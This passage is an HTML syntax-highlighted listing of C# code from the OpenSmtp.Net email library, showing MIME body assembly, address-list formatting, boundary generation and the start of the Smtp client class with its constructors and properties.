                </span><span class="sc11">sb</span><span class="sc10">.</span><span class="sc11">Append</span><span class="sc10">(</span><span class="sc11">GetTextMessageBody</span><span class="sc10">(</span><span class="sc11">htmlBody</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"text/html"</span><span class="sc10">));</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">
            </span><span class="sc5">else</span><span class="sc0">
            </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc11">sb</span><span class="sc10">.</span><span class="sc11">Append</span><span class="sc10">(</span><span class="sc11">GetAltMessageBody</span><span class="sc10">(</span><span class="sc0">
                    </span><span class="sc11">GetTextMessageBody</span><span class="sc10">(</span><span class="sc11">body</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"text/plain"</span><span class="sc10">),</span><span class="sc0">
                    </span><span class="sc11">GetTextMessageBody</span><span class="sc10">(</span><span class="sc11">htmlBody</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"text/html"</span><span class="sc10">)));</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">

            </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">sb</span><span class="sc10">.</span><span class="sc11">ToString</span><span class="sc10">();</span><span class="sc0">

        </span><span class="sc10">}</span><span class="sc0">


         </span><span class="sc5">private</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">GetTextMessageBody</span><span class="sc10">(</span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">messageBody</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">textType</span><span class="sc10">)</span><span class="sc0">
         </span><span class="sc10">{</span><span class="sc0">
             </span><span class="sc11">StringBuilder</span><span class="sc0"> </span><span class="sc11">sb</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">StringBuilder</span><span class="sc10">();</span><span class="sc0">

             </span><span class="sc11">sb</span><span class="sc10">.</span><span class="sc11">Append</span><span class="sc10">(</span><span class="sc6">"Content-Type: "</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">textType</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">";\r\n"</span><span class="sc10">);</span><span class="sc0">
             </span><span class="sc11">sb</span><span class="sc10">.</span><span class="sc11">Append</span><span class="sc10">(</span><span class="sc6">" charset=\""</span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">charset</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"\"\r\n"</span><span class="sc10">);</span><span class="sc0">
             </span><span class="sc11">sb</span><span class="sc10">.</span><span class="sc11">Append</span><span class="sc10">(</span><span class="sc6">"Content-Transfer-Encoding: quoted-printable\r\n\r\n"</span><span class="sc10">);</span><span class="sc0">
             </span><span class="sc11">sb</span><span class="sc10">.</span><span class="sc11">Append</span><span class="sc10">(</span><span class="sc11">MailEncoder</span><span class="sc10">.</span><span class="sc11">ConvertToQP</span><span class="sc10">(</span><span class="sc11">messageBody</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">charset</span><span class="sc10">));</span><span class="sc0">

             </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">sb</span><span class="sc10">.</span><span class="sc11">ToString</span><span class="sc10">();</span><span class="sc0">
         </span><span class="sc10">}</span><span class="sc0">

         </span><span class="sc5">private</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">GetAltMessageBody</span><span class="sc10">(</span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">messageBody1</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">messageBody2</span><span class="sc10">)</span><span class="sc0">
         </span><span class="sc10">{</span><span class="sc0">
             </span><span class="sc11">StringBuilder</span><span class="sc0"> </span><span class="sc11">sb</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">StringBuilder</span><span class="sc10">();</span><span class="sc0">

             </span><span class="sc11">sb</span><span class="sc10">.</span><span class="sc11">Append</span><span class="sc10">(</span><span class="sc6">"Content-Type: multipart/alternative;"</span><span class="sc10">);</span><span class="sc0">
             </span><span class="sc11">sb</span><span class="sc10">.</span><span class="sc11">Append</span><span class="sc10">(</span><span class="sc6">"boundary=\""</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">altBoundary</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"\""</span><span class="sc10">);</span><span class="sc0">

             </span><span class="sc11">sb</span><span class="sc10">.</span><span class="sc11">Append</span><span class="sc10">(</span><span class="sc6">"\r\n\r\nThis is a multi-part message in MIME format."</span><span class="sc10">);</span><span class="sc0">

             </span><span class="sc11">sb</span><span class="sc10">.</span><span class="sc11">Append</span><span class="sc10">(</span><span class="sc6">"\r\n\r\n--"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">altBoundary</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"\r\n"</span><span class="sc10">);</span><span class="sc0">
             </span><span class="sc11">sb</span><span class="sc10">.</span><span class="sc11">Append</span><span class="sc10">(</span><span class="sc11">messageBody1</span><span class="sc10">);</span><span class="sc0">
             </span><span class="sc11">sb</span><span class="sc10">.</span><span class="sc11">Append</span><span class="sc10">(</span><span class="sc6">"\r\n\r\n--"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">altBoundary</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"\r\n"</span><span class="sc10">);</span><span class="sc0">
             </span><span class="sc11">sb</span><span class="sc10">.</span><span class="sc11">Append</span><span class="sc10">(</span><span class="sc11">messageBody2</span><span class="sc10">);</span><span class="sc0">
             </span><span class="sc11">sb</span><span class="sc10">.</span><span class="sc11">Append</span><span class="sc10">(</span><span class="sc6">"\r\n\r\n--"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">altBoundary</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"--\r\n"</span><span class="sc10">);</span><span class="sc0">

             </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">sb</span><span class="sc10">.</span><span class="sc11">ToString</span><span class="sc10">();</span><span class="sc0">
         </span><span class="sc10">}</span><span class="sc0">


        </span><span class="sc2">// creates comma separated address list from to: and cc:
</span><span class="sc0">        </span><span class="sc5">private</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">CreateAddressList</span><span class="sc10">(</span><span class="sc11">ArrayList</span><span class="sc0"> </span><span class="sc11">msgList</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc11">StringBuilder</span><span class="sc0"> </span><span class="sc11">sb</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">StringBuilder</span><span class="sc10">();</span><span class="sc0">

            </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">index</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">msgCount</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">msgList</span><span class="sc10">.</span><span class="sc11">Count</span><span class="sc10">;</span><span class="sc0">

            </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">IEnumerator</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">msgList</span><span class="sc10">.</span><span class="sc11">GetEnumerator</span><span class="sc10">();</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">.</span><span class="sc11">MoveNext</span><span class="sc10">();</span><span class="sc0"> </span><span class="sc11">index</span><span class="sc10">++)</span><span class="sc0">
            </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc11">EmailAddress</span><span class="sc0"> </span><span class="sc11">a</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">EmailAddress</span><span class="sc10">)</span><span class="sc11">i</span><span class="sc10">.</span><span class="sc11">Current</span><span class="sc10">;</span><span class="sc0">

                </span><span class="sc2">// if the personal name exists, add it to the address sent. IE: "Ian Stallings" &lt;istallings@mail.com&gt;
</span><span class="sc0">                </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">a</span><span class="sc10">.</span><span class="sc11">name</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc5">null</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc11">a</span><span class="sc10">.</span><span class="sc11">name</span><span class="sc10">.</span><span class="sc11">Length</span><span class="sc0"> </span><span class="sc10">&gt;</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
                </span><span class="sc10">{</span><span class="sc0">                   
                    </span><span class="sc11">sb</span><span class="sc10">.</span><span class="sc11">Append</span><span class="sc10">(</span><span class="sc6">"\""</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">MailEncoder</span><span class="sc10">.</span><span class="sc11">ConvertHeaderToQP</span><span class="sc10">(</span><span class="sc11">a</span><span class="sc10">.</span><span class="sc11">name</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">charset</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"\" &lt;"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">a</span><span class="sc10">.</span><span class="sc11">address</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"&gt;"</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc10">}</span><span class="sc0">
                </span><span class="sc5">else</span><span class="sc0">
                </span><span class="sc10">{</span><span class="sc0">
                    </span><span class="sc11">sb</span><span class="sc10">.</span><span class="sc11">Append</span><span class="sc10">(</span><span class="sc6">"&lt;"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">a</span><span class="sc10">.</span><span class="sc11">address</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"&gt;"</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc10">}</span><span class="sc0">

                </span><span class="sc2">// if it's not the last address add a semi-colon:
</span><span class="sc0">                </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">msgCount</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc11">index</span><span class="sc10">)</span><span class="sc0">
                </span><span class="sc10">{</span><span class="sc0">
                    </span><span class="sc11">sb</span><span class="sc10">.</span><span class="sc11">Append</span><span class="sc10">(</span><span class="sc6">","</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc10">}</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">

            </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">sb</span><span class="sc10">.</span><span class="sc11">ToString</span><span class="sc10">();</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">

        </span><span class="sc5">private</span><span class="sc0"> </span><span class="sc16">static</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">generateMixedMimeBoundary</span><span class="sc10">()</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc2">// Below generates uniqe boundary for each message. These are used to separate mime parts in a message.
</span><span class="sc0">            </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc6">"Part."</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">Convert</span><span class="sc10">.</span><span class="sc11">ToString</span><span class="sc10">(</span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">Random</span><span class="sc10">(</span><span class="sc5">unchecked</span><span class="sc10">((</span><span class="sc16">int</span><span class="sc10">)</span><span class="sc11">DateTime</span><span class="sc10">.</span><span class="sc11">Now</span><span class="sc10">.</span><span class="sc11">Ticks</span><span class="sc10">)).</span><span class="sc11">Next</span><span class="sc10">())</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"."</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">Convert</span><span class="sc10">.</span><span class="sc11">ToString</span><span class="sc10">(</span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">Random</span><span class="sc10">(~</span><span class="sc5">unchecked</span><span class="sc10">((</span><span class="sc16">int</span><span class="sc10">)</span><span class="sc11">DateTime</span><span class="sc10">.</span><span class="sc11">Now</span><span class="sc10">.</span><span class="sc11">Ticks</span><span class="sc10">)).</span><span class="sc11">Next</span><span class="sc10">());</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">

         </span><span class="sc5">private</span><span class="sc0"> </span><span class="sc16">static</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">generateAltMimeBoundary</span><span class="sc10">()</span><span class="sc0">
         </span><span class="sc10">{</span><span class="sc0">
             </span><span class="sc2">// Below generates uniqe boundary for each message. These are used to separate mime parts in a message.
</span><span class="sc0">             </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc6">"Part."</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">Convert</span><span class="sc10">.</span><span class="sc11">ToString</span><span class="sc10">(</span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">Random</span><span class="sc10">(~</span><span class="sc5">unchecked</span><span class="sc10">((</span><span class="sc16">int</span><span class="sc10">)</span><span class="sc11">DateTime</span><span class="sc10">.</span><span class="sc11">Now</span><span class="sc10">.</span><span class="sc11">AddDays</span><span class="sc10">(</span><span class="sc4">1</span><span class="sc10">).</span><span class="sc11">Ticks</span><span class="sc10">)).</span><span class="sc11">Next</span><span class="sc10">())</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"."</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">Convert</span><span class="sc10">.</span><span class="sc11">ToString</span><span class="sc10">(</span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">Random</span><span class="sc10">(</span><span class="sc5">unchecked</span><span class="sc10">((</span><span class="sc16">int</span><span class="sc10">)</span><span class="sc11">DateTime</span><span class="sc10">.</span><span class="sc11">Now</span><span class="sc10">.</span><span class="sc11">AddDays</span><span class="sc10">(</span><span class="sc4">1</span><span class="sc10">).</span><span class="sc11">Ticks</span><span class="sc10">)).</span><span class="sc11">Next</span><span class="sc10">());</span><span class="sc0">
         </span><span class="sc10">}</span><span class="sc0">

        </span><span class="sc5">private</span><span class="sc0"> </span><span class="sc16">static</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">generateRelatedMimeBoundary</span><span class="sc10">()</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc2">// Below generates uniqe boundary for each message. These are used to separate mime parts in a message.
</span><span class="sc0">            </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc6">"Part."</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">Convert</span><span class="sc10">.</span><span class="sc11">ToString</span><span class="sc10">(</span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">Random</span><span class="sc10">(~</span><span class="sc5">unchecked</span><span class="sc10">((</span><span class="sc16">int</span><span class="sc10">)</span><span class="sc11">DateTime</span><span class="sc10">.</span><span class="sc11">Now</span><span class="sc10">.</span><span class="sc11">AddDays</span><span class="sc10">(</span><span class="sc4">2</span><span class="sc10">).</span><span class="sc11">Ticks</span><span class="sc10">)).</span><span class="sc11">Next</span><span class="sc10">())</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"."</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">Convert</span><span class="sc10">.</span><span class="sc11">ToString</span><span class="sc10">(</span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">Random</span><span class="sc10">(</span><span class="sc5">unchecked</span><span class="sc10">((</span><span class="sc16">int</span><span class="sc10">)</span><span class="sc11">DateTime</span><span class="sc10">.</span><span class="sc11">Now</span><span class="sc10">.</span><span class="sc11">AddDays</span><span class="sc10">(</span><span class="sc4">1</span><span class="sc10">).</span><span class="sc11">Ticks</span><span class="sc10">)).</span><span class="sc11">Next</span><span class="sc10">());</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">

     </span><span class="sc10">}</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">


</span><span class="sc5">namespace</span><span class="sc0"> </span><span class="sc11">OpenSmtp</span><span class="sc10">.</span><span class="sc11">Mail</span><span class="sc0"> 
</span><span class="sc10">{</span><span class="sc0">

</span><span class="sc3">/******************************************************************************
    Copyright 2001-2005 Ian Stallings
    OpenSmtp.Net is free software; you can redistribute it and/or modify
    it under the terms of the Lesser GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    OpenSmtp.Net is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    Lesser GNU General Public License for more details.

    You should have received a copy of the Lesser GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA
/*******************************************************************************/</span><span class="sc0">


</span><span class="sc5">using</span><span class="sc0"> </span><span class="sc11">System</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc5">using</span><span class="sc0"> </span><span class="sc11">System</span><span class="sc10">.</span><span class="sc11">IO</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc5">using</span><span class="sc0"> </span><span class="sc11">System</span><span class="sc10">.</span><span class="sc11">Net</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc5">using</span><span class="sc0"> </span><span class="sc11">System</span><span class="sc10">.</span><span class="sc11">Net</span><span class="sc10">.</span><span class="sc11">Sockets</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc5">using</span><span class="sc0"> </span><span class="sc11">System</span><span class="sc10">.</span><span class="sc11">Text</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc5">using</span><span class="sc0"> </span><span class="sc11">System</span><span class="sc10">.</span><span class="sc11">Threading</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc5">using</span><span class="sc0"> </span><span class="sc11">System</span><span class="sc10">.</span><span class="sc11">Collections</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc15">/// &lt;summary&gt;
</span><span class="sc0">    </span><span class="sc15">/// This Type sends a MailMessage using SMTP
</span><span class="sc0">    </span><span class="sc15">/// &lt;seealso cref="EmailAddress"/&gt;
</span><span class="sc0">    </span><span class="sc15">/// &lt;seealso cref="MailMessage"/&gt;
</span><span class="sc0">    </span><span class="sc15">/// &lt;seealso cref="SmtpConfig"/&gt;
</span><span class="sc0">    </span><span class="sc15">/// &lt;/summary&gt;
</span><span class="sc0">    </span><span class="sc15">/// &lt;example&gt;
</span><span class="sc0">    </span><span class="sc15">/// &lt;code&gt;
</span><span class="sc0">    </span><span class="sc15">///     from = new EmailAddress("support@OpenSmtp.com", "Support");
</span><span class="sc0">    </span><span class="sc15">///     to = new EmailAddress("recipient@OpenSmtp.com", "Joe Smith");
</span><span class="sc0">    </span><span class="sc15">///
</span><span class="sc0">    </span><span class="sc15">///     msg = new MailMessage(from, to);
</span><span class="sc0">    </span><span class="sc15">///     msg.Subject = "Testing OpenSmtp .Net SMTP component";
</span><span class="sc0">    </span><span class="sc15">///     msg.Body = "Hello Joe Smith.";
</span><span class="sc0">    </span><span class="sc15">/// 
</span><span class="sc0">    </span><span class="sc15">///     Smtp smtp = new Smtp("localhost", 25);
</span><span class="sc0">    </span><span class="sc15">///     smtp.SendMail(msg);
</span><span class="sc0">    </span><span class="sc15">/// &lt;/code&gt;
</span><span class="sc0">    </span><span class="sc15">/// &lt;/example&gt;
</span><span class="sc0">    </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc16">class</span><span class="sc0"> </span><span class="sc11">Smtp</span><span class="sc0">
    </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc5">internal</span><span class="sc0"> </span><span class="sc11">TcpClient</span><span class="sc0">  </span><span class="sc11">tcpc</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc5">internal</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc0">     </span><span class="sc11">host</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc5">internal</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0">        </span><span class="sc11">port</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">25</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc5">internal</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc0">     </span><span class="sc11">username</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc5">internal</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc0">     </span><span class="sc11">password</span><span class="sc10">;</span><span class="sc0">

        </span><span class="sc5">internal</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0">        </span><span class="sc11">sendTimeout</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">50000</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc5">internal</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0">        </span><span class="sc11">recieveTimeout</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">50000</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc5">internal</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0">        </span><span class="sc11">receiveBufferSize</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">1024</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc5">internal</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0">        </span><span class="sc11">sendBufferSize</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">1024</span><span class="sc10">;</span><span class="sc0">
        
        </span><span class="sc15">/// &lt;summary&gt;Default constructor&lt;/summary&gt;
</span><span class="sc0">        </span><span class="sc15">/// &lt;example&gt;
</span><span class="sc0">        </span><span class="sc15">/// &lt;code&gt;
</span><span class="sc0">        </span><span class="sc15">///     Smtp smtp = new Smtp();
</span><span class="sc0">        </span><span class="sc15">///     smtp.Host = "mail.OpenSmtp.com";
</span><span class="sc0">        </span><span class="sc15">///     smtp.Port = 25;
</span><span class="sc0">        </span><span class="sc15">/// &lt;/code&gt;
</span><span class="sc0">        </span><span class="sc15">/// &lt;/example&gt;
</span><span class="sc0">        </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc11">Smtp</span><span class="sc10">()</span><span class="sc0">
        </span><span class="sc10">{}</span><span class="sc0">
        

        </span><span class="sc15">/// &lt;summary&gt;Constructor specifying a host and port&lt;/summary&gt;
</span><span class="sc0">        </span><span class="sc15">/// &lt;example&gt;
</span><span class="sc0">        </span><span class="sc15">/// &lt;code&gt;
</span><span class="sc0">        </span><span class="sc15">///     Smtp smtp = new Smtp("mail.OpenSmtp.com", 25);
</span><span class="sc0">        </span><span class="sc15">/// &lt;/code&gt;
</span><span class="sc0">        </span><span class="sc15">/// &lt;/example&gt;
</span><span class="sc0">        </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc11">Smtp</span><span class="sc10">(</span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">host</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">port</span><span class="sc10">)</span><span class="sc0"> 
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc5">this</span><span class="sc10">.</span><span class="sc11">host</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">host</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc5">this</span><span class="sc10">.</span><span class="sc11">port</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">port</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">

        </span><span class="sc15">/// &lt;summary&gt;Constructor specifying a host, username and password&lt;/summary&gt;
</span><span class="sc0">        </span><span class="sc15">/// &lt;example&gt;
</span><span class="sc0">        </span><span class="sc15">/// &lt;code&gt;
</span><span class="sc0">        </span><span class="sc15">///     Smtp smtp = new Smtp("mail.OpenSmtp.com", "login", "pwd");
</span><span class="sc0">        </span><span class="sc15">/// &lt;/code&gt;
</span><span class="sc0">        </span><span class="sc15">/// &lt;/example&gt;
</span><span class="sc0">        </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc11">Smtp</span><span class="sc10">(</span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">host</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">username</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">password</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc5">this</span><span class="sc10">.</span><span class="sc11">Host</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">host</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc5">this</span><span class="sc10">.</span><span class="sc11">Port</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">port</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc5">this</span><span class="sc10">.</span><span class="sc11">Username</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">username</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc5">this</span><span class="sc10">.</span><span class="sc11">Password</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">password</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">

        </span><span class="sc15">/// &lt;summary&gt;Constructor specifying a host, username, password and port&lt;/summary&gt;
</span><span class="sc0">        </span><span class="sc15">/// &lt;example&gt;
</span><span class="sc0">        </span><span class="sc15">/// &lt;code&gt;
</span><span class="sc0">        </span><span class="sc15">///     Smtp smtp = new Smtp("mail.OpenSmtp.com", "login", "pwd", 25);
</span><span class="sc0">        </span><span class="sc15">/// &lt;/code&gt;
</span><span class="sc0">        </span><span class="sc15">/// &lt;/example&gt;
</span><span class="sc0">        </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc11">Smtp</span><span class="sc10">(</span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">host</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">username</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">password</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">port</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc5">this</span><span class="sc10">.</span><span class="sc11">Host</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">host</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc5">this</span><span class="sc10">.</span><span class="sc11">Port</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">port</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc5">this</span><span class="sc10">.</span><span class="sc11">Username</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">username</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc5">this</span><span class="sc10">.</span><span class="sc11">Password</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">password</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">

        </span><span class="sc2">//========================================================================
</span><span class="sc0">        </span><span class="sc2">// PROPERTIES
</span><span class="sc0">        </span><span class="sc2">//========================================================================
</span><span class="sc0">
        </span><span class="sc15">/// &lt;value&gt;Stores the Host address SMTP server. The default value is "localhost"&lt;/value&gt;
</span><span class="sc0">        </span><span class="sc15">/// &lt;example&gt;"mail.OpenSmtp.com"&lt;/example&gt;
</span><span class="sc0">        </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">Host</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc11">get</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc5">return</span><span class="sc10">(</span><span class="sc5">this</span><span class="sc10">.</span><span class="sc11">host</span><span class="sc10">);</span><span class="sc0"> </span><span class="sc10">}</span><span class="sc0">
            </span><span class="sc11">set</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc5">this</span><span class="sc10">.</span><span class="sc11">host</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">value</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">       

        </span><span class="sc15">/// &lt;value&gt;Stores the Port of the host SMTP server. The default value is port 25&lt;/value&gt;
